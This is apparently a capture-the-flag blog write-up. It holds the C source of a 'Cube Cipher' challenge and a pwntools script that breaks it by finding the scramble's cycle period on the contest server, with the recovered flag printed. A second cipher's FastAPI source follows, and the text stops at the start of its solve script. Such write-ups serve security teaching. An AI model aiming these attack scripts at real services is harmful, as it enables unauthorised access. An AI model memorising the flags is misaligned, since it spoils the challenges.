123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924925926927928929930931932933934935936937938939940941942943944945946947948949950951952953954955956957958959960961962963964965966967968969970971972973974975976977978979980981982983984985986987988989990991992993994995996997998999100010011002100310041005100610071008100910101011101210131014#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdbool.h&gt;#include &lt;string.h&gt;typedef uint8_t face_t;typedef uint8_t edge_t;typedef uint8_t center_t;typedef uint16_t corner_t;#define FACE_SIZE 4#define FACE_MASK ((1 &lt;&lt; FACE_SIZE) - 1)#define TWO_FACE_MASK ((1 &lt;&lt; 2 * FACE_SIZE) - 1)#define ALGORITHM_LENGTH 40const size_t CENTER_CT = 6;const size_t FACE_CT = CENTER_CT * 3 * 3;const size_t CORNER_CT = 8;const size_t EDGE_CT = 12;/** * Create a corner. */corner_t corner(const face_t top, const face_t left, const face_t right) &#123; return (top &lt;&lt; FACE_SIZE | left) &lt;&lt; FACE_SIZE | right;&#125;/** * Retrieve the top face of a corner. */face_t corner_top(const corner_t corner) &#123; return corner &gt;&gt; 2 * FACE_SIZE;&#125;/** * Retrieve the left face of a corner. */face_t corner_left(const corner_t corner) &#123; return (corner &gt;&gt; FACE_SIZE) &amp; FACE_MASK;&#125;/** * Retrieve the right face of a corner. */face_t corner_right(const corner_t corner) &#123; return corner &amp; FACE_MASK;&#125;/** * Create an edge. */edge_t edge(const face_t left, const face_t right) &#123; return left &lt;&lt; FACE_SIZE | right;&#125;/** * Retrieve the left face of an edge. */face_t edge_left(const edge_t edge) &#123; return (edge &gt;&gt; FACE_SIZE) &amp; FACE_MASK;&#125;/** * Retrieve the right face of an edge. */face_t edge_right(const edge_t edge) &#123; return edge &amp; FACE_MASK;&#125;/** * Flip an edge. */edge_t flip_edge(const edge_t edge) &#123; return edge &lt;&lt; FACE_SIZE | edge &gt;&gt; FACE_SIZE;&#125;/** * Rotate a corner clockwise. */corner_t rotate_corner(const corner_t corner) &#123; return ((corner &amp; FACE_MASK) &lt;&lt; 2 * FACE_SIZE) | (corner &gt;&gt; FACE_SIZE);&#125;/** * Rotate a corner counterclockwise. */corner_t rotate_corner_(const corner_t corner) &#123; return ((corner &amp; TWO_FACE_MASK) &lt;&lt; FACE_SIZE) | (corner &gt;&gt; 2 * FACE_SIZE);&#125;/** * Naming: * Each field is comprised of each face the piece touches. The first letter is * chosen from the following order of precedence: * * f - front * b - back * u - up * d - down * l - left * r - right * * Then, for corners, the other two are chosen as the left and right ones if * the first face were on top. */struct Cube &#123; corner_t ful; corner_t fru; corner_t fld; corner_t fdr; corner_t blu; corner_t bur; corner_t bdl; corner_t brd; edge_t fu; edge_t fr; edge_t fd; edge_t fl; edge_t bu; edge_t br; edge_t bd; edge_t bl; edge_t ur; edge_t ul; edge_t dr; edge_t dl; center_t f; center_t b; center_t u; center_t d; center_t l; center_t r;&#125;;/** * Rotate front face clockwise. */void move_F(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;ful; cube-&gt;ful = cube-&gt;fld; cube-&gt;fld = cube-&gt;fdr; cube-&gt;fdr = cube-&gt;fru; cube-&gt;fru = temp_corner; temp_edge = cube-&gt;fu; cube-&gt;fu = cube-&gt;fl; cube-&gt;fl = cube-&gt;fd; cube-&gt;fd = cube-&gt;fr; cube-&gt;fr = temp_edge;&#125;/** * Rotate front face counterclockwise. */void move_F_(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;ful; cube-&gt;ful = cube-&gt;fru; cube-&gt;fru = cube-&gt;fdr; cube-&gt;fdr = cube-&gt;fld; cube-&gt;fld = temp_corner; temp_edge = cube-&gt;fu; cube-&gt;fu = cube-&gt;fr; cube-&gt;fr = cube-&gt;fd; cube-&gt;fd = cube-&gt;fl; cube-&gt;fl = temp_edge;&#125;/** * Rotate back face clockwise. */void move_B(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;blu; cube-&gt;blu = cube-&gt;bur; cube-&gt;bur = cube-&gt;brd; cube-&gt;brd = cube-&gt;bdl; cube-&gt;bdl = temp_corner; temp_edge = cube-&gt;bu; cube-&gt;bu = cube-&gt;br; cube-&gt;br = cube-&gt;bd; cube-&gt;bd = cube-&gt;bl; cube-&gt;bl = temp_edge;&#125;/** * Rotate back face counterclockwise. */void move_B_(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;blu; cube-&gt;blu = cube-&gt;bdl; cube-&gt;bdl = cube-&gt;brd; cube-&gt;brd = cube-&gt;bur; cube-&gt;bur = temp_corner; temp_edge = cube-&gt;bu; cube-&gt;bu = cube-&gt;bl; cube-&gt;bl = cube-&gt;bd; cube-&gt;bd = cube-&gt;br; cube-&gt;br = temp_edge;&#125;/** * Rotate right face clockwise. */void move_R(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;fru; cube-&gt;fru = rotate_corner_(cube-&gt;fdr); cube-&gt;fdr = rotate_corner(cube-&gt;brd); cube-&gt;brd = rotate_corner_(cube-&gt;bur); cube-&gt;bur = rotate_corner(temp_corner); temp_edge = cube-&gt;fr; cube-&gt;fr = cube-&gt;dr; cube-&gt;dr = cube-&gt;br; cube-&gt;br = cube-&gt;ur; cube-&gt;ur = temp_edge;&#125;/** * Rotate right face counterclockwise. */void move_R_(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;fru; cube-&gt;fru = rotate_corner_(cube-&gt;bur); cube-&gt;bur = rotate_corner(cube-&gt;brd); cube-&gt;brd = rotate_corner_(cube-&gt;fdr); cube-&gt;fdr = rotate_corner(temp_corner); temp_edge = cube-&gt;fr; cube-&gt;fr = cube-&gt;ur; cube-&gt;ur = cube-&gt;br; cube-&gt;br = cube-&gt;dr; cube-&gt;dr = temp_edge;&#125;/** * Rotate left face clockwise. */void move_L(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;ful; cube-&gt;ful = rotate_corner(cube-&gt;blu); cube-&gt;blu = rotate_corner_(cube-&gt;bdl); cube-&gt;bdl = rotate_corner(cube-&gt;fld); cube-&gt;fld = rotate_corner_(temp_corner); temp_edge = cube-&gt;fl; cube-&gt;fl = cube-&gt;ul; cube-&gt;ul = cube-&gt;bl; cube-&gt;bl = cube-&gt;dl; cube-&gt;dl = temp_edge;&#125;/** * Rotate left face counterclockwise. */void move_L_(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;ful; cube-&gt;ful = rotate_corner(cube-&gt;fld); cube-&gt;fld = rotate_corner_(cube-&gt;bdl); cube-&gt;bdl = rotate_corner(cube-&gt;blu); cube-&gt;blu = rotate_corner_(temp_corner); temp_edge = cube-&gt;fl; cube-&gt;fl = cube-&gt;dl; cube-&gt;dl = cube-&gt;bl; cube-&gt;bl = cube-&gt;ul; cube-&gt;ul = temp_edge;&#125;/** * Rotate up face clockwise. */void move_U(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;ful; cube-&gt;ful = rotate_corner_(cube-&gt;fru); cube-&gt;fru = rotate_corner(cube-&gt;bur); cube-&gt;bur = rotate_corner_(cube-&gt;blu); cube-&gt;blu = rotate_corner(temp_corner); temp_edge = cube-&gt;fu; cube-&gt;fu = flip_edge(cube-&gt;ur); cube-&gt;ur = flip_edge(cube-&gt;bu); cube-&gt;bu = flip_edge(cube-&gt;ul); cube-&gt;ul = flip_edge(temp_edge);&#125;/** * Rotate up face counterclockwise. */void move_U_(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;ful; cube-&gt;ful = rotate_corner_(cube-&gt;blu); cube-&gt;blu = rotate_corner(cube-&gt;bur); cube-&gt;bur = rotate_corner_(cube-&gt;fru); cube-&gt;fru = rotate_corner(temp_corner); temp_edge = cube-&gt;fu; cube-&gt;fu = flip_edge(cube-&gt;ul); cube-&gt;ul = flip_edge(cube-&gt;bu); cube-&gt;bu = flip_edge(cube-&gt;ur); cube-&gt;ur = flip_edge(temp_edge);&#125;/** * Rotate down face clockwise. */void move_D(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;fld; cube-&gt;fld = rotate_corner(cube-&gt;bdl); cube-&gt;bdl = rotate_corner_(cube-&gt;brd); cube-&gt;brd = rotate_corner(cube-&gt;fdr); cube-&gt;fdr = rotate_corner_(temp_corner); temp_edge = cube-&gt;fd; cube-&gt;fd = flip_edge(cube-&gt;dl); cube-&gt;dl = flip_edge(cube-&gt;bd); cube-&gt;bd = flip_edge(cube-&gt;dr); cube-&gt;dr = flip_edge(temp_edge);&#125;/** * Rotate down face counterclockwise. */void move_D_(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;fld; cube-&gt;fld = rotate_corner(cube-&gt;fdr); cube-&gt;fdr = rotate_corner_(cube-&gt;brd); cube-&gt;brd = rotate_corner(cube-&gt;bdl); cube-&gt;bdl = rotate_corner_(temp_corner); temp_edge = cube-&gt;fd; cube-&gt;fd = flip_edge(cube-&gt;dr); cube-&gt;dr = flip_edge(cube-&gt;bd); cube-&gt;bd = flip_edge(cube-&gt;dl); cube-&gt;dl = flip_edge(temp_edge);&#125;/** * Rotate middle layer following L. */void move_M(struct Cube *cube) &#123; center_t temp_center; edge_t temp_edge; temp_center = cube-&gt;f; cube-&gt;f = cube-&gt;u; cube-&gt;u = cube-&gt;b; cube-&gt;b = cube-&gt;d; cube-&gt;d = temp_center; temp_edge = cube-&gt;fu; cube-&gt;fu = flip_edge(cube-&gt;bu); cube-&gt;bu = flip_edge(cube-&gt;bd); cube-&gt;bd = flip_edge(cube-&gt;fd); cube-&gt;fd = flip_edge(temp_edge);&#125;/** * Rotate middle layer following R. */void move_M_(struct Cube *cube) &#123; center_t temp_center; edge_t temp_edge; temp_center = cube-&gt;f; cube-&gt;f = cube-&gt;d; cube-&gt;d = cube-&gt;b; cube-&gt;b = cube-&gt;u; cube-&gt;u = temp_center; temp_edge = cube-&gt;fu; cube-&gt;fu = flip_edge(cube-&gt;fd); cube-&gt;fd = flip_edge(cube-&gt;bd); cube-&gt;bd = flip_edge(cube-&gt;bu); cube-&gt;bu = flip_edge(temp_edge);&#125;/** * Rotate middle layer following D. */void move_E(struct Cube *cube) &#123; center_t temp_center; edge_t temp_edge; temp_center = cube-&gt;f; cube-&gt;f = cube-&gt;l; cube-&gt;l = cube-&gt;b; cube-&gt;b = cube-&gt;r; cube-&gt;r = temp_center; temp_edge = cube-&gt;fr; cube-&gt;fr = flip_edge(cube-&gt;fl); cube-&gt;fl = flip_edge(cube-&gt;bl); cube-&gt;bl = flip_edge(cube-&gt;br); cube-&gt;br = flip_edge(temp_edge);&#125;/** * Rotate middle layer following U. */void move_E_(struct Cube *cube) &#123; center_t temp_center; edge_t temp_edge; temp_center = cube-&gt;f; cube-&gt;f = cube-&gt;r; cube-&gt;r = cube-&gt;b; cube-&gt;b = cube-&gt;l; cube-&gt;l = temp_center; temp_edge = cube-&gt;fr; cube-&gt;fr = flip_edge(cube-&gt;br); cube-&gt;br = flip_edge(cube-&gt;bl); cube-&gt;bl = flip_edge(cube-&gt;fl); cube-&gt;fl = flip_edge(temp_edge);&#125;/** * Rotate middle layer following F. */void move_S(struct Cube *cube) &#123; center_t temp_center; edge_t temp_edge; temp_center = cube-&gt;u; cube-&gt;u = cube-&gt;l; cube-&gt;l = cube-&gt;d; cube-&gt;d = cube-&gt;r; cube-&gt;r = temp_center; temp_edge = cube-&gt;ur; cube-&gt;ur = flip_edge(cube-&gt;ul); cube-&gt;ul = flip_edge(cube-&gt;dl); cube-&gt;dl = flip_edge(cube-&gt;dr); cube-&gt;dr = flip_edge(temp_edge);&#125;/** * Rotate middle layer following B. */void move_S_(struct Cube *cube) &#123; center_t temp_center; edge_t temp_edge; temp_center = cube-&gt;u; cube-&gt;u = cube-&gt;r; cube-&gt;r = cube-&gt;d; cube-&gt;d = cube-&gt;l; cube-&gt;l = temp_center; temp_edge = cube-&gt;ur; cube-&gt;ur = flip_edge(cube-&gt;dr); cube-&gt;dr = flip_edge(cube-&gt;dl); cube-&gt;dl = flip_edge(cube-&gt;ul); cube-&gt;ul = flip_edge(temp_edge);&#125;/** * Rotate cube following R. */void move_x(struct Cube *cube) &#123; move_L_(cube); move_M_(cube); move_R(cube);&#125;/** * Rotate cube following L. */void move_x_(struct Cube *cube) &#123; move_L(cube); move_M(cube); move_R_(cube);&#125;/** * Rotate cube following U. */void move_y(struct Cube *cube) &#123; move_U(cube); move_E_(cube); move_D_(cube);&#125;/** * Rotate cube following D. */void move_y_(struct Cube *cube) &#123; move_U_(cube); move_E(cube); move_D(cube);&#125;/** * Rotate cube following F. */void move_z(struct Cube *cube) &#123; move_F(cube); move_S(cube); move_B_(cube);&#125;/** * Rotate cube following B. */void move_z_(struct Cube *cube) &#123; move_F_(cube); move_S_(cube); move_B(cube);&#125;/** * Print out the cube in the following format: * * u u u * u u u * u u u * * l l l f f f r r r * l l l f f f r r r * l l l f f f r r r * * d d d * d d d * d d d * * b b b * b b b * b b b */void print_cube(struct Cube cube) &#123; /* u u u */ printf(&quot; %2i %2i %2i\\n&quot;, corner_right(cube.blu), edge_right(cube.bu), corner_left(cube.bur)); /* u u u */ printf(&quot; %2i %2i %2i\\n&quot;, edge_left(cube.ul), (face_t)cube.u, edge_left(cube.ur)); /* u u u */ printf(&quot; %2i %2i %2i\\n&quot;, corner_left(cube.ful), edge_right(cube.fu), corner_right(cube.fru)); printf(&quot;\\n&quot;); /* l l l u u u f f f*/ printf(&quot;%2i %2i %2i %2i %2i %2i %2i %2i %2i\\n&quot;, corner_left(cube.blu), edge_right(cube.ul), corner_right(cube.ful), corner_top(cube.ful), edge_left(cube.fu), corner_top(cube.fru), corner_left(cube.fru), edge_right(cube.ur), corner_right(cube.bur)); /* l l l u u u f f f*/ printf(&quot;%2i %2i %2i %2i %2i %2i %2i %2i %2i\\n&quot;, edge_right(cube.bl), (face_t)cube.l, edge_right(cube.fl), edge_left(cube.fl), (face_t)cube.f, edge_left(cube.fr), edge_right(cube.fr), (face_t)cube.r, edge_right(cube.br)); /* l l l u u u f f f*/ printf(&quot;%2i %2i %2i %2i %2i %2i %2i %2i %2i\\n&quot;, corner_right(cube.bdl), edge_right(cube.dl), corner_left(cube.fld), corner_top(cube.fld), edge_left(cube.fd), corner_top(cube.fdr), corner_right(cube.fdr), edge_right(cube.dr), corner_left(cube.brd)); printf(&quot;\\n&quot;); /* d d d */ printf(&quot; %2i %2i %2i\\n&quot;, corner_right(cube.fld), edge_right(cube.fd), corner_left(cube.fdr)); /* d d d */ printf(&quot; %2i %2i %2i\\n&quot;, edge_left(cube.dl), (face_t)cube.d, edge_left(cube.dr)); /* d d d */ printf(&quot; %2i %2i %2i\\n&quot;, corner_left(cube.bdl), edge_right(cube.bd), corner_right(cube.brd)); printf(&quot;\\n&quot;); /* b b b */ printf(&quot; %2i %2i %2i\\n&quot;, corner_top(cube.bdl), edge_left(cube.bd), corner_top(cube.brd)); /* b b b */ printf(&quot; %2i %2i %2i\\n&quot;, edge_left(cube.bl), (face_t)cube.b, edge_left(cube.br)); /* b b b */ printf(&quot; %2i %2i %2i\\n&quot;, corner_top(cube.blu), edge_left(cube.bu), corner_top(cube.bur));&#125;#define NIBBLE_SIZE 4#define NIBBLE_MASK ((1 &lt;&lt; NIBBLE_SIZE) - 1)#define NIBBLE(input, i) ((input[i / 2] &gt;&gt; NIBBLE_SIZE * (1 - i % 2)) \\ &amp; NIBBLE_MASK)/** * Build a cube from a string of length * `FACE_CT / 2` from its nibbles in this order: * * 18 19 20 * 21 22 23 * 24 25 26 * * 27 28 29 00 01 02 09 10 11 * 30 31 32 03 04 05 12 13 14 * 33 34 35 06 07 08 15 16 17 * * 36 37 38 * 39 40 41 * 42 43 44 * * 45 46 47 * 48 49 50 * 51 52 53 */void build_cube_from_string(struct Cube *cube, const char *input) &#123; cube-&gt;ful = corner( NIBBLE(input, 0), NIBBLE(input, 24), NIBBLE(input, 29) ); cube-&gt;fru = corner( NIBBLE(input, 2), NIBBLE(input, 9), NIBBLE(input, 26) ); cube-&gt;fld = corner( NIBBLE(input, 6), NIBBLE(input, 35), NIBBLE(input, 36) ); cube-&gt;fdr = corner( NIBBLE(input, 8), NIBBLE(input, 38), NIBBLE(input, 15) ); cube-&gt;blu = corner( NIBBLE(input, 51), NIBBLE(input, 27), NIBBLE(input, 18) ); cube-&gt;bur = corner( NIBBLE(input, 53), NIBBLE(input, 20), NIBBLE(input, 11) ); cube-&gt;bdl = corner( NIBBLE(input, 45), NIBBLE(input, 42), NIBBLE(input, 33) ); cube-&gt;brd = corner( NIBBLE(input, 47), NIBBLE(input, 17), NIBBLE(input, 44) ); cube-&gt;fu = edge( NIBBLE(input, 1), NIBBLE(input, 25) ); cube-&gt;fr = edge( NIBBLE(input, 5), NIBBLE(input, 12) ); cube-&gt;fd = edge( NIBBLE(input, 7), NIBBLE(input, 37) ); cube-&gt;fl = edge( NIBBLE(input, 3), NIBBLE(input, 32) ); cube-&gt;bu = edge( NIBBLE(input, 52), NIBBLE(input, 19) ); cube-&gt;br = edge( NIBBLE(input, 50), NIBBLE(input, 14) ); cube-&gt;bd = edge( NIBBLE(input, 46), NIBBLE(input, 43) ); cube-&gt;bl = edge( NIBBLE(input, 48), NIBBLE(input, 30) ); cube-&gt;ur = edge( NIBBLE(input, 23), NIBBLE(input, 10) ); cube-&gt;ul = edge( NIBBLE(input, 21), NIBBLE(input, 28) ); cube-&gt;dr = edge( NIBBLE(input, 41), NIBBLE(input, 16) ); cube-&gt;dl = edge( NIBBLE(input, 39), NIBBLE(input, 34) ); cube-&gt;f = NIBBLE(input, 4); cube-&gt;r = NIBBLE(input, 13); cube-&gt;u = NIBBLE(input, 22); cube-&gt;l = NIBBLE(input, 31); cube-&gt;d = NIBBLE(input, 40); cube-&gt;b = NIBBLE(input, 49);&#125;void set_nibble(unsigned char *bytes, const size_t i, const uint8_t nibble) &#123; bytes[i / 2] &amp;= (NIBBLE_MASK &lt;&lt; (NIBBLE_SIZE * (i % 2))); bytes[i / 2] |= nibble &lt;&lt; (NIBBLE_SIZE * (1 - i % 2));&#125;void extract_bytes_from_front( const struct Cube cube, unsigned char *output, const size_t base ) &#123; set_nibble(output, base + 0, corner_top(cube.ful)); set_nibble(output, base + 1, edge_left(cube.fu)); set_nibble(output, base + 2, corner_top(cube.fru)); set_nibble(output, base + 3, edge_left(cube.fl)); set_nibble(output, base + 4, (face_t)cube.f); set_nibble(output, base + 5, edge_left(cube.fr)); set_nibble(output, base + 6, corner_top(cube.fld)); set_nibble(output, base + 7, edge_left(cube.fd)); set_nibble(output, base + 8, corner_top(cube.fdr));&#125;void extract_bytes_from_cube(struct Cube cube, unsigned char *output) &#123; /* front */ extract_bytes_from_front(cube, output, 9 * 0); move_y(&amp;cube); /* right */ extract_bytes_from_front(cube, output, 9 * 1); move_y_(&amp;cube); move_x_(&amp;cube); /* up */ extract_bytes_from_front(cube, output, 9 * 2); move_x(&amp;cube); move_y_(&amp;cube); /* left */ extract_bytes_from_front(cube, output, 9 * 3); move_y(&amp;cube); move_x(&amp;cube); /* down */ extract_bytes_from_front(cube, output, 9 * 4); move_x(&amp;cube); /* back */ extract_bytes_from_front(cube, output, 9 * 5);&#125;/** * Execute an algorithm. */void execute_algorithm(struct Cube *cube, const char *str) &#123; size_t i; void (*F[])(struct Cube*) = &#123; move_F, move_F_, &#125;; void (*R[])(struct Cube*) = &#123; move_R, move_R_, &#125;; void (*L[])(struct Cube*) = &#123; move_L, move_L_, &#125;; void (*U[])(struct Cube*) = &#123; move_U, move_U_, &#125;; void (*D[])(struct Cube*) = &#123; move_D, move_D_, &#125;; void (*B[])(struct Cube*) = &#123; move_B, move_B_, &#125;; void (*M[])(struct Cube*) = &#123; move_M, move_M_, &#125;; void (*E[])(struct Cube*) = &#123; move_E, move_E_, &#125;; void (*S[])(struct Cube*) = &#123; move_S, move_S_, &#125;; void (*x[])(struct Cube*) = &#123; move_x, move_x_, &#125;; void (*y[])(struct Cube*) = &#123; move_y, move_y_, &#125;; void (*z[])(struct Cube*) = &#123; move_z, move_z_, &#125;; const size_t len = strlen(str); for (i = 0; i &lt; len; i++) &#123; const int inverse = str[i + 1] == &#x27;\\&#x27;&#x27; ? 1 : 0; switch (str[i]) &#123; case &#x27;F&#x27;: F[inverse](cube); break; case &#x27;R&#x27;: R[inverse](cube); break; case &#x27;L&#x27;: L[inverse](cube); break; case &#x27;U&#x27;: U[inverse](cube); break; case &#x27;D&#x27;: D[inverse](cube); break; case &#x27;B&#x27;: B[inverse](cube); break; case &#x27;M&#x27;: M[inverse](cube); break; case &#x27;E&#x27;: E[inverse](cube); break; case &#x27;S&#x27;: S[inverse](cube); break; case &#x27;x&#x27;: x[inverse](cube); break; case &#x27;y&#x27;: y[inverse](cube); break; case &#x27;z&#x27;: z[inverse](cube); break; default: printf(&quot;[WARN] unrecognized move: %c\\n&quot;, str[i]); break; &#125; /* skip the inverse character if present */ i += inverse; &#125;&#125;char *get_flag() &#123; char *flag = calloc(FACE_CT / 2 + 1, sizeof(char)); FILE *file; file = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if (file == NULL) &#123; perror(&quot;failed to open flag.txt for reading&quot;); exit(1); &#125; fread(flag, FACE_CT / 2, 1, file); fclose(file); return flag;&#125;char *get_algorithm() &#123; char *algorithm = calloc(ALGORITHM_LENGTH + 1, sizeof(char)); FILE *file; file = fopen(&quot;algorithm.txt&quot;, &quot;r&quot;); if (file == NULL) &#123; perror(&quot;failed to open algorithm.txt for reading&quot;); exit(1); &#125; fread(algorithm, sizeof(char), ALGORITHM_LENGTH, file); fclose(file); return algorithm;&#125;/** * Cube Cipher implementation */int main() &#123; size_t i; struct Cube *cube = calloc(1, sizeof(struct Cube)); char *flag = get_flag(); char *scramble_algorithm = get_algorithm(); unsigned char *output = calloc(FACE_CT, sizeof(unsigned char)); int option; char algorithm_str[256]; setvbuf(stdout, 0, 2, 0); build_cube_from_string(cube, flag); free(flag); execute_algorithm(cube, scramble_algorithm); printf(&quot;Welcome to the Interactive Cube Cipher App!\\n&quot; &quot;Try and break my cipher! (you can&#x27;t)\\n&quot; &quot;Options:\\n&quot; &quot;\\t1: Execute an algorithm\\n&quot; &quot;\\t2: Display cube\\n&quot; &quot;\\t3: Display cube as bytes\\n&quot; &quot;\\t4: Re-apply cube cipher\\n&quot; &quot;\\t5: Exit\\n&quot; ); option = 0; while (option != 5) &#123;get_option: printf(&quot;Option: &quot;); if (scanf(&quot;%d&quot;, &amp;option) != 1) &#123; while (getchar() != &#x27;\\n&#x27;); printf(&quot;Please enter an integer.\\n&quot;); goto get_option; &#125; switch (option) &#123; case 1: printf(&quot;Enter your algorithm:\\n&gt; &quot;); scanf(&quot;%255s&quot;, algorithm_str); execute_algorithm(cube, algorithm_str); break; case 2: print_cube(*cube); break; case 3: extract_bytes_from_cube(*cube, output); for (i = 0; i &lt; FACE_CT / 2; i++) &#123; printf(&quot;%02x&quot;, output[i]); &#125; printf(&quot;\\n&quot;); break; case 4: printf(&quot;Scrambling...\\n&quot;); execute_algorithm(cube, scramble_algorithm); break; case 5: printf(&quot;Goodbye!\\n&quot;); break; default: printf(&quot;Invalid option.\\n&quot;); &#125; &#125; free(output); free(cube); free(scramble_algorithm); return 0;&#125; 12345678910# Cube CipherThe Cube Cipher is my own invention: A modern unbreakable cipher.The Cube Cipher is a 27-character block cipher that works as follows:1. The plaintext is padded to a 27-byte boundary with null bytes.2. Each byte is brocken up into nibbles and each nibble is arranged on a Rubik&#x27;s Cube in this order: 18 19 20 21 22 23 24 25 26 27 28 29 00 01 02 09 10 11 30 31 32 03 04 05 12 13 14 33 34 35 06 07 08 15 16 17 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 12343. The cube is folded, shuffled according to a pre-selected &quot;algorithm&quot;, and unwraveled into a new stream.Someone who knows the algorithm can then reverse this by applying it in reverse. 这道题代码太长了懒得看，直接扔GPT一把梭了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env python3from pwn import *import binasciiHOST = &quot;cube-cipher.challs.pwnoh.io&quot;PORT = 1337context.log_level = &quot;debug&quot; # debug 太吵了def send_opt_after_prompt(r, n): r.sendlineafter(b&quot;Option: &quot;, str(n).encode())def dump_hex(r): send_opt_after_prompt(r, 3) # 服务端会输出一行 hex + &#x27;\\n&#x27; hexline = r.recvline().strip().decode() return hexlinedef reapply(r): send_opt_after_prompt(r, 4) r.recvuntil(b&quot;Scrambling...\\n&quot;) # 这里不要把随后的 &#x27;Option: &#x27; 提示读掉，让下一步去等def main(): r = remote(HOST, PORT, ssl=True) # 把欢迎文本读到菜单出现即可 r.recvuntil(b&quot;Options:\\n&quot;) # 第一次的十六进制（P(flag)） first_hex = dump_hex(r) # 找置换周期 t：最小正整数 k 使再次回到 first_hex k = 0 while True: k += 1 if k % 100 == 0: log.info(f&quot;searching period… tried &#123;k&#125;&quot;) reapply(r) cur_hex = dump_hex(r) if cur_hex == first_hex: t = k log.success(f&quot;period found: t = &#123;t&#125;&quot;) break # 再应用 (t-1) 次回到 flag for _ in range(t - 1): reapply(r) flag_hex = dump_hex(r) data = binascii.unhexlify(flag_hex).rstrip(b&quot;\\x00&quot;) try: print(data.decode(&quot;utf-8&quot;, errors=&quot;replace&quot;)) except: print(data)if __name__ == &quot;__main__&quot;: main()# bctf&#123;the_cUb3_pl4yS_Y0U&#125; Clandescriptorius 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from fastapi import FastAPI, HTTPExceptionfrom fastapi.staticfiles import StaticFilesfrom pydantic import BaseModelfrom dataclasses import dataclassimport osimport hashlibflag = os.environ.get(&quot;FLAG&quot;) or &quot;bctf&#123;fake_flag_fake_flag_fake_flag_fake_flag&#125;&quot;def xor(aa: bytes, bb: bytes): return bytes(a ^ b for a, b in zip(aa, bb))def pad(data: bytes): padding_length = 16 - (len(data) % 16) return data + bytes([padding_length] * padding_length)def encrypt_block(block: bytes, key: bytes, timestamp: int, block_index: int): keystream = hashlib.sha256( f&quot;&#123;key.hex()&#125;&#123;timestamp&#125;&#123;block_index&#125;&quot;.encode() ).digest()[0:16] return xor(keystream, block)def encrypt(data: bytes, key: bytes, timestamp: int): padded = pad(data) blocks = [padded[i : i + 16] for i in range(0, len(padded), 16)] return b&quot;&quot;.join( encrypt_block(block, key, timestamp, i) for i, block in enumerate(blocks) )@dataclassclass Session: last_timestamp: int key: bytessessions: dict[str, Session] = &#123;&#125;app = FastAPI()class StartSessionRequest(BaseModel): timestamp: int@app.post(&quot;/startsession&quot;)def route_startsession(request: StartSessionRequest): session_id = os.urandom(16).hex() key = os.urandom(32) timestamp = request.timestamp encrypted_flag = encrypt(flag.encode(), key, timestamp) sessions[session_id] = Session(last_timestamp=timestamp, key=key) return &#123; &quot;session_id&quot;: session_id, &quot;encrypted_flag&quot;: encrypted_flag.hex(), &#125;class EncryptRequest(BaseModel): session_id: str timestamp: int data: str@app.post(&quot;/encrypt&quot;)def route_encrypt(request: EncryptRequest): try: session = sessions[request.session_id] except KeyError: raise HTTPException(status_code=400, detail=&quot;Invalid session id&quot;) try: data = bytes.fromhex(request.data) except ValueError: raise HTTPException(status_code=400, detail=&quot;Invalid hex in data&quot;) if request.timestamp &lt;= session.last_timestamp: raise HTTPException(status_code=400, detail=&quot;Non-increasing timestamp&quot;) session.last_timestamp = request.timestamp return &#123;&quot;encrypted&quot;: encrypt(data, session.key, request.timestamp).hex()&#125;app.mount(&quot;/&quot;, StaticFiles(directory=&quot;static&quot;, html=True), name=&quot;static&quot;) 懒得写WP了，先把代码仍这里。 1234567891011121314151617181920212223242526272829303132333435363738import requests, binasciiBASE = 